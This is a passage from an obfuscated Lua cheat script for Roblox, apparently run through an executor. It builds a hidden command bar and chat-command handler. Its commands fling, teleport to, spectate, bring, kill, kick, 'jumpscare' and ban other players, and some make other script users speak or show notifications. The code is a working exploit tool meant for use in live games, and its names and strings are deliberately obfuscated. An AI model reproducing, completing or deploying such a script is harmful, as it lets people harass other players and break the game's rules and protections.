 getgenv()._tsb_RCS_Cmd("\097\100\100\099\104\114\111\109\111\115\111\109\101", nil, function (_IIIlIlIIll, _lIlIllIlll) local _llIlllIIII = _llllllIlIl[_IIIlIlIIll.UserId] if not _llIlllIIII or not _llIlllIIII.supportsHooks then _IllIIlIIll:Notify({ Title = _lIllIllIII("\067\111\109\109\097\110\100\032\098\097\114"), Content = "\116\104\105\115\032\098\117\109\032\104\097\118\101\032\097\032\098\097\100\032\101\120\101\099\117\116\111\114\044\032\099\097\110\116\032\097\100\100\032\097\032\099\104\114\111\109\111\115\111\109\101\032\116\111\032\116\104\101\109", _IllIIlIlll = 0x4 }) return nil end
 return tostring(_IIIlIlIIll.UserId) .. "\044" .. tostring(_llIIIlIIll.UserId) end
 ) getgenv()._tsb_RCS_Cmd("\114\101\109\111\118\101\099\104\114\111\109\111\115\111\109\101") getgenv()._tsb_RCS_Cmd("\107\105\099\107", nil, function (_IIIlIlIIll, _lIlIllIlll) local _IIlIIIllll = #_lIlIllIlll > 0x1 and table.concat(_lIlIllIlll, "\032", 0x2) or "" return tostring(_IIIlIlIIll.UserId) .. (_IIlIIIllll ~= "" and ("\044" .. _IIlIIIllll) or "") end
 ) getgenv()._tsb_RCS_Cmd("\115\097\121", nil, function (_IIIlIlIIll, _lIlIllIlll) local _lIllIIIIll = #_lIlIllIlll > 0x1 and table.concat(_lIlIllIlll, "\032", 0x2) or "" return tostring(_IIIlIlIIll.UserId) .. "\044" .. _lIllIIIIll end
 ) getgenv()._tsb_RCS_Cmd("\110\111\116\105\102\121", nil, function (_IIIlIlIIll, _lIlIllIlll) local _lIllIIIIll = #_lIlIllIlll > 0x1 and table.concat(_lIlIllIlll, "\032", 0x2) or "" return tostring(_IIIlIlIIll.UserId) .. "\044" .. _lIllIIIIll end
 ) getgenv()._tsb_RCS_Cmd("\106\117\109\112\115\099\097\114\101") getgenv()._tsb_RCS_Cmd("\098\101\109\121\115\116\097\110\100") getgenv()._tsb_RCS_Cmd("\115\116\111\112\098\101\105\110\103\109\121\115\116\097\110\100") end
 Players.PlayerRemoving:Connect( function (_IIIIIlIlll) _llllllIlIl[_IIIIIlIlll.UserId] = nil end
 ) _IIllllIIll("\108\105\115\116\114\101\118\101\110\097\110\116\117\115\101\114\115", {"\108\105\115\116\114\101\118"}, function (_lllIlllIIl) local _IIIlIllIIl = {} for userId, _IIIlIlIlIl in pairs(_llllllIlIl) do local _IIIIIlIlll = _IIIlIlIlIl.player if _IIIIIlIlll and _IIIIIlIlll.Parent then table.insert(_IIIlIllIIl, _IIIIIlIlll.DisplayName .. "\032\040\064" .. _IIIIIlIlll.Name .. "\041") end
 end
 if #_IIIlIllIIl == 0x0 then _IllIIlIIll:Notify({ Title = _lIllIllIII("\067\111\109\109\097\110\100\032\098\097\114"), Content = "\078\111\032\082\101\118\101\110\097\110\116\032\117\115\101\114\115\032\105\110\032\116\104\105\115\032\115\101\114\118\101\114\046", _IllIIlIlll = 0x4 }) else _IllIIlIIll:Notify({ Title = _lIllIllIII("\067\111\109\109\097\110\100\032\098\097\114"), Content = table.concat(_IIIlIllIIl, "\044\032"), _IllIIlIlll = 0x6 }) end
 end
 ) table.insert(_llIlllIlIl, function () if _RCS_AnchorConn then _RCS_AnchorConn:Disconnect() _RCS_AnchorConn = nil end
 if _RCS_MsgConn then _RCS_MsgConn:Disconnect() _RCS_MsgConn = nil end
 end
 ) task.delay(0x2, function () if typeof(hookfunction) == "\102\117\110\099\116\105\111\110" then _RCS_Send("\105\110\105\116\032\105\032\115\117\112\112\111\114\116\032\104\111\111\107\115") else _RCS_Send("\105\110\105\116\032\105\032\100\111\110\116\032\115\117\112\112\111\114\116\032\104\111\111\107\115") end
 end
 ) end
 local _lllIIlIIIl = _lIlIlIllIl.Commands:AddLeftGroupbox("\083\101\116\116\105\110\103\115", "\115\101\116\116\105\110\103\115\045\050") local _IIIIIlIIll = _lIlIlIllIl.Commands:AddRightGroupbox("\067\111\109\109\097\110\100\115", "\116\101\114\109\105\110\097\108") _lIIIIIIIll = _lllIIlIIIl _lllIIlIIIl:AddToggle("\067\111\109\109\097\110\100\066\097\114", { Text = "\067\111\109\109\097\110\100\032\066\097\114", Default = false, }):AddKeyPicker("\067\111\109\109\097\110\100\066\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\083\101\109\105\099\111\108\111\110", Text = "\067\111\109\109\097\110\100\032\066\097\114\032\075\101\121\098\105\110\100", NoUI = true, }) _lllIIlIIIl:AddToggle("\085\115\101\067\111\109\109\097\110\100\115\105\110\067\104\097\116", { Text = "\085\115\101\032\067\111\109\109\097\110\100\115\032\105\110\032\067\104\097\116", Default = false, }) _lllIIlIIIl:AddToggle("\083\101\110\100\067\111\109\109\097\110\100\073\110\067\104\097\116", { Text = "\083\101\110\100\032\067\111\109\109\097\110\100\032\073\110\032\067\104\097\116", Default = false, }) _lllIIlIIIl:AddDivider() _lllIIlIIIl:AddDropdown("\067\109\100\070\108\105\110\103\077\101\116\104\111\100", { Text = "\070\108\105\110\103\032\084\121\112\101", Values = { "\065\110\116\105\045\070\108\105\110\103", "\078\111\114\109\097\108", "\086\111\105\100" }, Default = 0x3, Multi = false, }) _lllIIlIIIl:AddSlider("\070\108\105\110\103\083\112\101\101\100", { Text = "\070\108\105\110\103\032\083\112\101\101\100", Default = 0xF, Min = 0xF, Max = 0x5A, Rounding = 0x0, Compact = true, }) _lllIIlIIIl:AddSlider("\070\108\105\110\103\084\105\109\101\111\117\116", { Text = "\070\108\105\110\103\032\084\105\109\101\111\117\116", Default = 0x3, Min = 0x1, Max = 0x5, Rounding = 0x0, Compact = true, }) _IlIIIIIIIl() local _lIIlIlIIII = { "\103\111\116\111", "\102\108\105\110\103", "\108\111\111\112\102\108\105\110\103", "\117\110\102\108\105\110\103", "\118\105\101\119", "\117\110\118\105\101\119", "\119\104\105\116\101\108\105\115\116", "\117\110\119\104\105\116\101\108\105\115\116", "\114\101\106\111\105\110", "\114\101\115\101\116", "\102\105\120\099\097\109", } local _llIlIllIIl = { "\098\114\105\110\103", "\107\105\108\108", "\097\110\099\104\111\114", "\117\110\097\110\099\104\111\114", "\115\111\110\105\099", "\107\105\099\107", "\117\110\108\111\097\100", "\097\100\100\099\104\114\111\109\111\115\111\109\101", "\114\101\109\111\118\101\099\104\114\111\109\111\115\111\109\101", "\098\101\109\121\115\116\097\110\100", "\115\116\111\112\098\101\105\110\103\109\121\115\116\097\110\100", "\115\097\121", "\110\111\116\105\102\121", "\106\117\109\112\115\099\097\114\101", "\108\105\115\116\114\101\118\101\110\097\110\116\117\115\101\114\115", } local _lIIlIllIII = { "\098\097\110", } local _llIllllIIl = { unview = true, unspectate = true, rejoin = true, rj = true, reset = true, fixcam = true, listrevenantusers = true, listrev = true, } local _IlIlIllllI = { say = true, notify = true, kick = true } local function _llIIIllIIl() local _lIllIIIIII = _IlIllIIllI.CmdBarMethod and _IlIllIIllI.CmdBarMethod.Value or "\068\101\102\097\117\108\116" local _llIllllIIl = {} if _lIllIIIIII == "\068\101\102\097\117\108\116" then for _lllIlllIIl, _IIIlIlllll in ipairs(_lIIlIlIIII) do _llIllllIIl[#_llIllllIIl + 0x1] = _IIIlIlllll end
 else if _RCS_MyRank <= 0x3 then for _lllIlllIIl, _IIIlIlllll in ipairs(_llIlIllIIl) do _llIllllIIl[#_llIllllIIl + 0x1] = _IIIlIlllll end
 if _RCS_MyRank == 0x1 then for _lllIlllIIl, _IIIlIlllll in ipairs(_lIIlIllIII) do _llIllllIIl[#_llIllllIIl + 0x1] = _IIIlIlllll end
 end
 end
 end
 return _llIllllIIl end
 local function _IllIIIIIlI() local _lIllIIIIII = _IlIllIIllI.CmdBarMethod and _IlIllIIllI.CmdBarMethod.Value or "\068\101\102\097\117\108\116" local _llIllllIIl = { "\091\065\108\108\093" } if _lIllIIIIII == "\068\101\102\097\117\108\116" then for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll then _llIllllIIl[#_llIllllIIl + 0x1] = _IIIlllIIll(_IIIIIlIlll) end
 end
 else for userId, _IIIlIlIlIl in pairs(_llllllIlIl) do local _IIIIIlIlll = _IIIlIlIlIl.player if _IIIIIlIlll and _IIIIIlIlll.Parent and _IIIIIlIlll ~= _llIIIlIIll then _llIllllIIl[#_llIllllIIl + 0x1] = _IIIlllIIll(_IIIIIlIlll) end
 end
 end
 return _llIllllIIl end
 local _llIlIIllll = _lllIIlIIIl:AddDependencyGroupbox() _llIlIIllll:AddDropdown("\067\109\100\066\097\114\077\101\116\104\111\100", { Text = "\077\101\116\104\111\100", Values = _RCS_MyRank <= 0x3 and { "\068\101\102\097\117\108\116", "\084\114\117\115\116\101\100" } or { "\068\101\102\097\117\108\116" }, Default = "\068\101\102\097\117\108\116", Callback = function () pcall( function () _IlIllIIllI.CmdBarCommand:SetValues(_llIIIllIIl()) end
 ) pcall( function () _IlIllIIllI.CmdBarPlayer:SetValues(_IllIIIIIlI()) end
 ) end
 , }) _llIlIIllll:AddDropdown("\067\109\100\066\097\114\067\111\109\109\097\110\100", { Text = "\067\111\109\109\097\110\100", Values = _llIIIllIIl(), Default = 0x1, Searchable = true, Callback = function (_lIllIlIIll) local _llIIllllIl = _IlIlIllllI[_lIllIlIIll and _lIllIlIIll:lower() or ""] or false pcall( function () _IlIllIIllI.CmdBarMessage:SetVisible(_llIIllllIl) end
 ) end
 , }) _llIlIIllll:AddInput("\067\109\100\066\097\114\077\101\115\115\097\103\101", { Text = "\077\101\115\115\097\103\101", Default = '', Placeholder = "\080\117\116\032\116\104\101\032\109\101\115\115\097\103\101\032\104\101\114\101", Visible = false, }) local _IlIllIIIll = _llIlIIllll:AddDropdown("\067\109\100\066\097\114\080\108\097\121\101\114", { Text = "\080\108\097\121\101\114", Values = _IllIIIIIlI(), Default = '', Searchable = true, AllowNull = true, }) task.spawn( function () task.wait(0.5) pcall( function () _IlIllIIllI.CmdBarCommand:SetValues(_llIIIllIIl()) end
 ) pcall( function () _IlIllIIllI.CmdBarPlayer:SetValues(_IllIIIIIlI()) end
 ) end
 ) _llIlIIllll:AddButton({ Text = "\082\117\110\032\067\111\109\109\097\110\100", Func = function () local _IllIIIlIll = _IlIllIIllI.CmdBarCommand and _IlIllIIllI.CmdBarCommand.Value if not _IllIIIlIll or _IllIIIlIll == '' then return end
 _IllIIIlIll = _IllIIIlIll:lower() local _lIlIllIlll = {} if not _llIllllIIl[_IllIIIlIll] then local _llIIIIllll = tostring(_IlIllIIllI.CmdBarPlayer and _IlIllIIllI.CmdBarPlayer.Value or '') if _llIIIIllll == '' then _IllIIlIIll:Notify({ Title = _lIllIllIII("\067\111\109\109\097\110\100\032\066\097\114"), Content = "\080\105\099\107\032\097\032\112\108\097\121\101\114\032\111\114\032\091\065\108\108\093\046", _IllIIlIlll = 0x3 }) return end
 if _llIIIIllll == "\091\065\108\108\093" then _lIlIllIlll[0x1] = "\097\108\108" else local _IIIlIlIIll = _IlIllIIIII(_llIIIIllll) if not _IIIlIlIIll then _IllIIlIIll:Notify({ Title = _lIllIllIII("\067\111\109\109\097\110\100\032\066\097\114"), Content = "\073\110\118\097\108\105\100\032\112\108\097\121\101\114\046", _IllIIlIlll = 0x3 }) return end
 _lIlIllIlll[0x1] = _IIIlIlIIll.Name end
 end
 if _IlIlIllllI[_IllIIIlIll] then local _IlIIIllIlI = _IlIllIIllI.CmdBarMessage and _IlIllIIllI.CmdBarMessage.Value or '' if _IllIIIlIll == "\107\105\099\107" and (_IlIIIllIlI == '' or _IlIIIllIlI == nil) then _IlIIIllIlI = "\069\120\112\108\111\105\116\105\110\103" end
 if (_IllIIIlIll == "\115\097\121" or _IllIIIlIll == "\110\111\116\105\102\121") and (_IlIIIllIlI == '' or _IlIIIllIlI == nil) then _IllIIlIIll:Notify({ Title = _lIllIllIII("\067\111\109\109\097\110\100\032\066\097\114"), Content = "\084\121\112\101\032\097\032\109\101\115\115\097\103\101\032\102\105\114\115\116\046", _IllIIlIlll = 0x3 }) return end
 _lIlIllIlll[0x2] = _IlIIIllIlI end
 if _IllIIIIIIl[_IllIIIlIll] or _IIlIlIlIll[_IllIIIlIll] then task.spawn(_lIllllIIIl, _IllIIIlIll, _lIlIllIlll) else _IllIIlIIll:Notify({ Title = _lIllIllIII("\067\111\109\109\097\110\100\032\066\097\114"), Content = "\085\110\107\110\111\119\110\032\099\111\109\109\097\110\100\046", _IllIIlIlll = 0x3 }) end
 end
 , }) _llIlIIllll:SetupDependencies({ { _IIlIlIIlIl.CommandBar, true }, }) Players.PlayerAdded:Connect( function () pcall( function () _IlIllIIIll:SetValues(_IllIIIIIlI()) end
 ) end
 ) Players.PlayerRemoving:Connect( function () pcall( function () _IlIllIIIll:SetValues(_IllIIIIIlI()) end
 ) end
 ) _IIIIIlIIll:AddLabel("\059\103\111\116\111\047\116\112\047\116\111\032\123\112\108\097\121\101\114\125\092\114\092\110\059\102\108\105\110\103\047\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125\092\114\092\110\059\108\111\111\112\102\108\105\110\103\047\108\111\111\112\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125\092\114\092\110\059\117\110\102\108\105\110\103\047\117\110\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\118\105\101\119\047\115\112\101\099\116\097\116\101\032\123\112\108\097\121\101\114\125\092\114\092\110\059\117\110\118\105\101\119\047\117\110\115\112\101\099\116\097\116\101\092\114\092\110\059\119\104\105\116\101\108\105\115\116\047\097\100\100\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125\092\114\092\110\059\117\110\119\104\105\116\101\108\105\115\116\047\114\101\109\111\118\101\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125\092\114\092\110\059\114\101\106\111\105\110\047\114\106\092\114\092\110\059\114\101\115\101\116\092\114\092\110\059\102\105\120\099\097\109", true) if _RCS_MyRank <= 0x3 then _IIIIIlIIll:AddDivider() local _llIIIllIll = "\069\120\116\114\097\032\099\111\109\109\097\110\100\115\032\040\105\102\032\116\104\101\032\116\097\114\103\101\116\032\105\115\032\097\032\082\101\118\101\110\097\110\116\032\117\115\101\114\041\058\092\114\092\110\059\098\114\105\110\103\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\107\105\108\108\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\097\110\099\104\111\114\047\117\110\097\110\099\104\111\114\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\115\111\110\105\099\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\107\105\099\107\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\117\110\108\111\097\100\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\097\100\100\099\104\114\111\109\111\115\111\109\101\047\114\101\109\111\118\101\099\104\114\111\109\111\115\111\109\101\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\098\101\109\121\115\116\097\110\100\047\115\116\111\112\098\101\105\110\103\109\121\115\116\097\110\100\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\115\097\121\032\123\112\108\097\121\101\114\044\097\108\108\125\032\123\109\101\115\115\097\103\101\125\092\114\092\110\059\110\111\116\105\102\121\032\123\112\108\097\121\101\114\044\097\108\108\125\032\123\109\101\115\115\097\103\101\125\092\114\092\110\059\106\117\109\112\115\099\097\114\101\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125\092\114\092\110\059\108\105\115\116\114\101\118\101\110\097\110\116\047\108\105\115\116\114\101\118" if _RCS_MyRank == 0x1 then _llIIIllIll = _llIIIllIll .. "\092\114\092\110\059\098\097\110\032\123\112\108\097\121\101\114\044\097\108\108\125" end
 _IIIIIlIIll:AddLabel(_llIIIllIll, true) end
 if _lIlIIlIlII.TouchEnabled and not _lIlIIlIlII.KeyboardEnabled then _IIIIIlIIll:AddDivider() _IIIIIlIIll:AddLabel("\105\102\032\121\111\117\114\101\032\097\032\109\111\098\105\108\101\032\117\115\101\114\032\097\110\100\032\119\097\110\116\032\116\111\032\117\115\101\032\099\111\109\109\097\110\100\115\032\116\117\114\110\032\111\110\032\034\117\115\101\032\099\111\109\109\097\110\100\115\032\105\110\032\099\104\097\116\034\032\097\110\100\032\116\121\112\101\032\034\059\040\099\111\109\109\097\110\100\032\116\104\097\116\032\121\111\117\032\119\105\115\104\041\034\032\115\111\032\121\111\117\032\099\097\110\032\117\115\101\032\116\104\101\032\099\111\109\109\097\110\100\032\098\097\114", true) end
 task.spawn( function () local _lllIIlllll = nil if get_hidden_gui or gethui then _lllIIlllll = (get_hidden_gui or gethui)() elseif game:GetService("\067\111\114\101\071\117\105"):FindFirstChild("\082\111\098\108\111\120\071\117\105") then _lllIIlllll = game:GetService("\067\111\114\101\071\117\105").RobloxGui else _lllIIlllll = game:GetService("\067\111\114\101\071\117\105") end
 local _lIIllIllll = Instance.new("\083\099\114\101\101\110\071\117\105") _lIIllIllll.Enabled = false _lIIllIllll.ResetOnSpawn = false _lIIllIllll.DisplayOrder = 0x186A0 pcall( function () _lIIllIllll.Parent = _lllIIlllll end
 ) local _IIlllllIII = Instance.new("\070\114\097\109\101", _lIIllIllll) _IIlllllIII.BackgroundColor3 = Color3.new(0x0, 0x0, 0x0) _IIlllllIII.BorderColor3 = Color3.new(0x0, 0x0, 0x0) _IIlllllIII.Size = UDim2.new(0x1, -0x4, 0x0, 0x14) _IIlllllIII.ZIndex = 0x5 local _IllllIIIlI = Instance.new("\070\114\097\109\101", _IIlllllIII) _IllllIIIlI.BackgroundColor3 = Color3.fromRGB(0x1C, 0x1C, 0x1C) _IllllIIIlI.BorderColor3 = Color3.fromRGB(0x32, 0x32, 0x32) _IllllIIIlI.BorderMode = Enum.BorderMode.Inset _IllllIIIlI.Size = UDim2.new(0x1, 0x0, 0x1, 0x0) _IllllIIIlI.ZIndex = 0x6 local _IIIIlIIlll = Instance.new("\085\073\071\114\097\100\105\101\110\116", _IllllIIIlI) _IIIIlIIlll.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0x0, Color3.new(0x1, 0x1, 0x1)), ColorSequenceKeypoint.new(0x1, Color3.fromRGB(0xD4, 0xD4, 0xD4)), }) _IIIIlIIlll.Rotation = 0x5A local _IlIIllllIl = Instance.new("\070\114\097\109\101", _IllllIIIlI) _IlIIllllIl.BackgroundTransparency = 0x1 _IlIIllllIl.ClipsDescendants = true _IlIIllllIl.Position = UDim2.new(0x0, 0x5, 0x0, 0x0) _IlIIllllIl.Size = UDim2.new(0x1, -0x5, 0x1, 0x0) _IlIIllllIl.ZIndex = 0x7 local _IIIIlIIIIl = Instance.new("\084\101\120\116\076\097\098\101\108", _IlIIllllIl) _IIIIlIIIIl.BackgroundTransparency = 0x1 _IIIIlIIIIl.Position = UDim2.fromOffset(0x0, 0x0) _IIIIlIIIIl.Size = UDim2.fromScale(0x5, 0x1) _IIIIlIIIIl.Font = Enum.Font.Code _IIIIlIIIIl.Text = '' _IIIIlIIIIl.TextColor3 = Color3.fromRGB(0xFF, 0xFF, 0xFF) _IIIIlIIIIl.TextTransparency = 0.5 _IIIIlIIIIl.TextSize = 0xE _IIIIlIIIIl.TextStrokeTransparency = 0.7 _IIIIlIIIIl.TextXAlignment = Enum.TextXAlignment.Left _IIIIlIIIIl.ZIndex = 0x7 local _lIIlIIlIll = Instance.new("\084\101\120\116\066\111\120", _IlIIllllIl) _lIIlIIlIll.BackgroundTransparency = 0x1 _lIIlIIlIll.Position = UDim2.fromOffset(0x0, 0x0) _lIIlIIlIll.Size = UDim2.fromScale(0x5, 0x1) _lIIlIIlIll.Font = Enum.Font.Code _lIIlIIlIll.PlaceholderColor3 = Color3.fromRGB(0xBE, 0xBE, 0xBE) _lIIlIIlIll.PlaceholderText = '' _lIIlIIlIll.Text = '' _lIIlIIlIll.TextColor3 = Color3.fromRGB(0xFF, 0xFF, 0xFF) _lIIlIIlIll.TextSize = 0xE _lIIlIIlIll.TextStrokeTransparency = 0x0 _lIIlIIlIll.TextXAlignment = Enum.TextXAlignment.Left _lIIlIIlIll.ClearTextOnFocus = true _lIIlIIlIll.ZIndex = 0x8 _lIIlIIlIll:GetPropertyChangedSignal("\084\101\120\116"):Connect( function () if _lIIlIIlIll.Text:match("\094\037\115\042\036") then _IIIIlIIIIl.Text = '' else local _IlIlllIlII = _lIIlIIlIll.Text:split("\032") local _IIlllllIll = _IlIlllIlII[0x1] and _IlIlllIlII[0x1]:lower() or '' local _IIIIlIIlII = _IlIlllIlII[0x2] _IIIIlIIIIl.Text = '' local function _lllIIllIII(str) if not str then return nil end
 for userId, _IIIlIlIlIl in pairs(_llllllIlIl) do local _IIIIIlIlll = _IIIlIlIlIl.player if _IIIIIlIlll and _IIIIIlIlll.Parent and _IIIIIlIlll ~= _llIIIlIIll then local _IlIIIllIII = str:lower() if _IIIIIlIlll.Name:lower():find("\094" .. _IlIIIllIII) or _IIIIIlIlll.DisplayName:lower():find("\094" .. _IlIIIllIII) then return _IIIIIlIlll end
 end
 end
 return nil end
 local _lIlIIlllII = { bring=true, kill=true, _IlIIllIIlI=true, unanchor=true, sonic=true, kick=true, unload=true, say=true, notify=true, listrevenantusers=true, listrev=true, } local _IlIIIIIlIl = { _IIlIIIllIl=true, others=true, random=true } if _IIlllllIll ~= '' then for _IllIIIlIll, _lllIlllIIl in pairs(_IllIIIIIIl) do if _IllIIIlIll:find("\094" .. _IIlllllIll) then local _IIIIIlIlll = nil if _IIIIlIIlII and not _IlIIIIIlIl[_IIIIlIIlII:lower()] then if _lIlIIlllII[_IllIIIlIll] then _IIIIIlIlll = _lllIIllIII(_IIIIlIIlII) else _IIIIIlIlll = _lIllIIIllI(_IIIIlIIlII) end
 end
 if _IIIIIlIlll then local _lIllIIlllI = _IllIIIlIll .. "\032" .. _IIIIIlIlll.DisplayName _IIIIlIIIIl.Text = _lIIlIIlIll.Text .. _lIllIIlllI:sub(#_lIIlIIlIll.Text + 0x1) else _IIIIlIIIIl.Text = _lIIlIIlIll.Text .. _IllIIIlIll:sub(#_IIlllllIll + 0x1) end
 return end
 end
 for alias, _lllIlllIIl in pairs(_IIlIlIlIll) do if alias:find("\094" .. _IIlllllIll) then local _IIIIIlIlll = nil if _IIIIlIIlII and not _IlIIIIIlIl[_IIIIlIIlII:lower()] then if _lIlIIlllII[alias] then _IIIIIlIlll = _lllIIllIII(_IIIIlIIlII) else _IIIIIlIlll = _lIllIIIllI(_IIIIlIIlII) end
 end
 if _IIIIIlIlll then local _lIllIIlllI = alias .. "\032" .. _IIIIIlIlll.DisplayName _IIIIlIIIIl.Text = _lIIlIIlIll.Text .. _lIllIIlllI:sub(#_lIIlIIlIll.Text + 0x1) else _IIIIlIIIIl.Text = _lIIlIIlIll.Text .. alias:sub(#_IIlllllIll + 0x1) end
 return end
 end
 end
 end
 end
 ) _lIIlIIlIll.FocusLost:Connect( function (enterPressed) if enterPressed and _IIlIlIIlIl.CommandBar.Value and not _lIIlIIlIll.Text:match("\094\037\115\042\036") then _IIIIlIIIIl.Text = '' local _lIIllIllIl = _lIIlIIlIll.Text local _IlllllIIll = _lIIllIllIl:split("\032") if _IlllllIIll then local _IlIllIIlIl = _IlllllIIll[0x1] if _IlIllIIlIl then _IlIllIIlIl = _IlllllIIll[0x1]:lower() end
 if _IlIllIIlIl and (_IllIIIIIIl[_IlIllIIlIl] or _IIlIlIlIll[_IlIllIIlIl]) then table.remove(_IlllllIIll, 0x1) task.spawn(_lIllllIIIl, _IlIllIIlIl, _IlllllIIll) if _IIlIlIIlIl.SendCommandInChat.Value then if _IllIIIIIIl[_IlIllIIlIl] or _IIlIlIlIll[_IlIllIIlIl] then _llIIIlllIl = true pcall( function () local _lIIlIllIlI = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101") local _IIllllIlII = _lIIlIllIlI.TextChannels:FindFirstChild("\082\066\088\071\101\110\101\114\097\108") if _IIllllIlII then _IIllllIlII:SendAsync("\059" .. _lIIllIllIl) end
 end
 ) end
 end
 end
 end
 end
 _lIIllIllll.Enabled = false end
 ) _lIlIIlIlII.InputBegan:Connect( function (inputObj, _lllIlllIIl) if not _lIlIIlIlII:GetFocusedTextBox() and inputObj.KeyCode == Enum.KeyCode[_IlIllIIllI.CommandBind.Value] and _IIlIlIIlIl.CommandBar.Value then _lIIllIllll.Enabled = true _lIIlIIlIll:CaptureFocus() task.spawn( function () repeat _lIIlIIlIll.Text = '' _IIIIlIIIIl.Text = '' RunService.RenderStepped:Wait() until _lIIlIIlIll.Text == '' and _IIIIlIIIIl.Text == '' end
 ) end
 end
 ) local _lIlIIlIIll = nil local function _lllIIllIIl() if _lIlIIlIIll then _lIlIIlIIll:Disconnect() _lIlIIlIIll = nil end
 if not _IIlIlIIlIl.UseCommandsinChat.Value then return end
 _lIlIIlIIll = _llIIIlIIll.Chatted:Connect( function (text) if _llIIIlllIl then _llIIIlllIl = false return end
 if text and text:find("\094\037\115\042\059") then local _lIllIIIIII = text:find("\059") local _IIIIllIlll = text:sub(_lIllIIIIII + 0x1) local _IlIlllIlII = _IIIIllIlll:split("\032") local _IllIIIlIll = _IlIlllIlII[0x1] and _IlIlllIlII[0x1]:lower() or '' if _IllIIIIIIl[_IllIIIlIll] or _IIlIlIlIll[_IllIIIlIll] then table.remove(_IlIlllIlII, 0x1) task.spawn(_lIllllIIIl, _IllIIIlIll, _IlIlllIlII) end
 end
 end
 ) end
 _IIlIlIIlIl.UseCommandsinChat:OnChanged( function () _lllIIllIIl() end
 ) _lllIIllIIl() table.insert(_llIlllIlIl, function () if _lIlIIIIIll then _lIlIIIIIll:Disconnect() _lIlIIIIIll = nil end
 pcall( function () _lIIllIllll:Destroy() end
 ) if _lIlIIlIIll then _lIlIIlIIll:Disconnect() _lIlIIlIIll = nil end
 pcall( function () _IIlIlIIlIl.CommandBar:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.UseCommandsinChat:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.SendCommandInChat:SetValue(false) end
 ) end
 ) end
 ) end
 local function _IllllIIIIl() pcall( function () if getgenv()._standDeactivateFn then getgenv()._standDeactivateFn() end
 end
 ) _IIllIlIlIl = false if _llIIllIIIl then _llIIllIIIl:Disconnect() _llIIllIIIl = nil end
 _IlIIIlllII() if _lIIIIllIIl then _lIIIIllIIl:Disconnect() _lIIIIllIIl = nil end
 if _lllIlIIIII then _lllIlIIIII:Disconnect() _lllIlIIIII = nil end
 if _lIlIIIlIll then _lIlIIIlIll:Disconnect() _lIlIIIlIll = nil end
 _lIllIIIIlI = false _IIlIllIIII = nil for key, _IIIlIlIlIl in pairs(_lIIIIIIIII) do if _IIIlIlIlIl.Track then pcall( function () if _IIIlIlIlIl.Track.IsPlaying then _IIIlIlIlIl.Track:Stop() end
 end
 ) pcall( function () _IIIlIlIlIl.Track:Destroy() end
 ) _IIIlIlIlIl.Track = nil end
 if _IIIlIlIlIl.IsActive ~= nil then _IIIlIlIlIl.IsActive = false end
 end
 if _lIIIlIIIII then pcall( function () _lIIIlIIIII:Stop() end
 ) pcall( function () _lIIIlIIIII:Destroy() end
 ) _lIIIlIIIII = nil end
 _llIIIIllll = false SwitcherActive = false pcall( function () if _IlIllIlIll then _IlIllIlIll:Disconnect() _IlIllIlIll = nil end
 if _IlIllIllII then _IlIllIllII:Disconnect() _IlIllIllII = nil end
 if _IllIllllIl then _IllIllllIl:Disconnect() _IllIllllIl = nil end
 if _IlIIlIlllI then _IlIIlIlllI:Disconnect() _IlIIlIlllI = nil end
 if _IllllIIlII and _IllllIIlII.Parent then _IllllIIlII:Destroy() _IllllIIlII = nil end
 if getgenv().FPDH then workspace.FallenPartsDestroyHeight = getgenv().FPDH end
 end
 ) pcall( function () local _IIllllIlII = _llIIIlIIll.Character local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII then workspace.CurrentCamera.CameraSubject = _IlIIIlIIII end
 end
 ) for _lllIlllIIl, task_fn in ipairs(_llIlllIlIl) do pcall(task_fn) end
 getgenv().InvisActive = false getgenv().FUCActive = false getgenv().TrashcanIsRunning = false getgenv().TrashcanAlreadyExecuted = false getgenv().TrashcanActiveHookSet = false getgenv().TrashcanDied = false getgenv().postTrashLoopActive = false getgenv().OldPos = nil getgenv().desync = nil getgenv().flingDesync = nil getgenv().FPDH = nil getgenv()._invisSavedTPose = nil getgenv().stopInvisibilityFn = nil getgenv()._revenantAntiFlingBuild = nil getgenv()._revenantTPMode = nil getgenv().morph = nil getgenv().Moveset_Settings = nil getgenv()._sgOrigSetDecal = nil getgenv()._revenantDashCooldown = false getgenv()._revenantDashCooldownUntil = nil getgenv()._revenantTechActive = false getgenv()._wcDashOnCooldown = false getgenv()._revenantTechFiring = false pcall( function () if _IlIIlIIllI then _IlIIlIIllI:Disconnect() _IlIIlIIllI = nil end
 if _IlIllllIll then _IlIllllIll:Disconnect() _IlIllllIll = nil end
 if _llIlllIlIl then _llIlllIlIl:Disconnect() _llIlllIlIl = nil end
 if _llIlIllIII then _llIlIllIII:Disconnect() _llIlIllIII = nil end
 if _lllllIIIII then _lllllIIIII:Disconnect() _lllllIIIII = nil end
 if _llllllllII then _llllllllII:Disconnect() _llllllllII = nil end
 if _llllIllIlI then _llllIllIlI:Disconnect() _llllIllIlI = nil end
 pcall( function () if _lllIIIIIII and _lllIIIIIII.Parent then _lllIIIIIII:Destroy() end
 end
